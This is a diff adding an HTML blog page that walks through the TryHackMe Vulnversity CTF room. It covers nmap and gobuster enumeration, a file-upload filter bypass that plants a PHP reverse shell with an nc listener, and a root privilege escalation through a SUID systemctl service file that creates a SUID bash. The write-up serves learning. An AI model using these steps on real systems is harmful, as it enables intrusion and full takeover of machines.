@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link href="style.css" rel="stylesheet" />
+  <title>🛡️ Vulnversity – TryHackMe Walkthrough</title>
+</head>
+<body class="bg-gray-50 text-gray-800 font-sans min-h-screen flex flex-col">
+  <nav class="bg-white shadow p-4 flex justify-between items-center">
+    <h1 class="text-xl font-bold">Tuna</h1>
+    <ul class="flex gap-4">
+      <li><a href="index.html" class="hover:text-blue-500">Home</a></li>
+      <li><a href="cv.html" class="hover:text-blue-500">CV</a></li>
+      <li><a href="projects.html" class="hover:text-blue-500">Projects</a></li>
+    </ul>
+  </nav>
+
+  <main class="flex-grow flex justify-center px-4 py-10">
+    <article class="w-full max-w-4xl bg-white shadow-lg rounded-2xl p-8 space-y-8">
+      <header>
+        <h2 class="text-3xl font-bold text-gray-900">🛡️ Vulnversity – TryHackMe CTF Walkthrough</h2>
+        <p class="mt-4 text-gray-700 leading-relaxed">
+          This write-up covers my walkthrough of the Vulnversity CTF room on TryHackMe, aimed at building foundational skills in web exploitation.
+          Although this CTF is beginner-friendly, it provides an excellent foundation for those new to web exploitation. It walks you through the basics using essential tools and offers an enjoyable, hands-on experience that can be completed in about an hour.
+        </p>
+        <p class="text-sm text-gray-500 mt-4"><strong>⚠️ Disclaimer:</strong> Flags and exploits shown here are for educational use only.</p>
+      </header>
+
+      <section id="nmap">
+        <h3 class="text-2xl font-semibold mb-4">1️⃣ Nmap – Initial Enumeration</h3>
+        <img src="assets/images/replace_nmap.png" alt="Nmap scan results" class="rounded shadow w-full mb-4" />
+        <p class="text-gray-700 mb-4">
+          Once you've deployed the target machine, you're ready to begin. Naturally, the first step is running an Nmap scan.
+          While many CTF rooms tend to skip over this part or assume you already know it, I really appreciated that this one actually emphasizes it.
+          As we all know, Nmap is absolutely vital for reconnaissance—and this room makes that clear from the start.
+        </p>
+        <pre><code class="language-bash">nmap -sC -sV -p- 10.10.X.X -oN nmap_tcp_full.txt</code></pre>
+      </section>
+
+      <section id="gobuster">
+        <h3 class="text-2xl font-semibold mb-4">2️⃣ Gobuster – Web Content Discovery</h3>
+        <img src="assets/images/replace_gobuster.png" alt="Gobuster results" class="rounded shadow w-full mb-4" />
+        <p class="text-gray-700 mb-4">
+          The next step is directory enumeration using Gobuster. Since this is a web exploitation room, we obviously need a directory we can actually exploit.😆
+          We take the IP address of the target machine and combine it with the web server port we discovered during the Nmap scan to launch a brute-force attack on potential directories.
+          PS: The CTF uses Gobuster in the walkthrough, but tools like Dirb or ffuf would also get the job done—pick your weapon of choice.
+        </p>
+        <pre><code class="language-bash">gobuster dir -u http://10.10.X.X:3333 -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt</code></pre>
+      </section>
+
+      <section id="burp">
+        <h3 class="text-2xl font-semibold mb-4">3️⃣ BurpSuite – File‑Upload Bypass</h3>
+        <img src="assets/images/replace_burp.png" alt="BurpSuite Intruder fuzz" class="rounded shadow w-full mb-4" />
+        <p class="text-gray-700">
+          Now that we’ve identified the target directory, it’s time to bring everything together and navigate to the address.
+          Once loaded, we’re greeted with a file upload page—and that’s where things start to get interesting.
+          Using Burp Suite, we perform a brute-force attack to enumerate which file extensions are allowed.
+          Pro tip: If you’re not familiar with Burp, you might want to pause and get comfortable with it first—this room assumes you already know how to use it.
+        </p>
+      </section>
+
+      <section id="reverse-shell">
+        <h3 class="text-2xl font-semibold mb-4">4️⃣ Reverse Shell – www‑data Access</h3>
+        <img src="assets/images/replace_shell.png" alt="Reverse shell screenshot" class="rounded shadow w-full mb-4" />
+        <p class="text-gray-700 mb-4">
+          With the allowed extensions now discovered, the next step is gaining access via a reverse shell.
+          This is where things start to get a bit more advanced.
+          Think of the web server as a castle—and the upload directory we found earlier as its front gate.
+          But this gate has guards: it doesn’t let just any file through. To get past them, our file needs to be in a format they recognize—in this case, .phtml.
+          We took PentestMonkey’s PHP reverse shell, modified it by inserting our USERNAME0 IP address, and uploaded it as php-reverse-shell.phtml.
+          Once we triggered the file, we successfully received a shell as www-data.
+        </p>
+        <pre><code class="language-bash"># listener
+nc -lvnp 4444
+
+# reverse shell URL (trigger)
+http://10.10.X.X:3333/internal/uploads/php-reverse-shell.phtml</code></pre>
+      </section>
+
+      <section id="privesc">
+        <h3 class="text-2xl font-semibold mb-4">5️⃣ Privilege Escalation – Root via SUID systemctl</h3>
+        <img src="assets/images/replace_privesc.png" alt="Privilege escalation screenshot" class="rounded shadow w-full mb-4" />
+        <p class="text-gray-700 mb-4">
+          And now… the finale. We’ve snuck into the castle—but there’s a catch. The identity we assumed is that of a lowly peasant. Our mission? Take the throne. Become root.
+          Here's how we pulled it off: A SUID bit set on /bin/systemctl gave us the ability to create and launch our own malicious service as root. Using that, we dropped a root-owned SUID bash binary into /tmp:
+        </p>
+        <pre><code class="language-bash"># Create malicious service
+cat <<'EOF' > /tmp/rootme.service
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Link, enable, and start the service
+/bin/systemctl link /tmp/rootme.service
+/bin/systemctl enable rootme.service
+/bin/systemctl start rootme.service
+
+# Pop root shell
+/tmp/rootbash -p</code></pre>
+        <p class="text-gray-700 mt-4">And just like that — root access achieved. A quick <code>cat /root/root.txt</code> and the final flag was ours. 🏁</p>
+      </section>
+    </article>
+  </main>
+</body>
+</html>
+
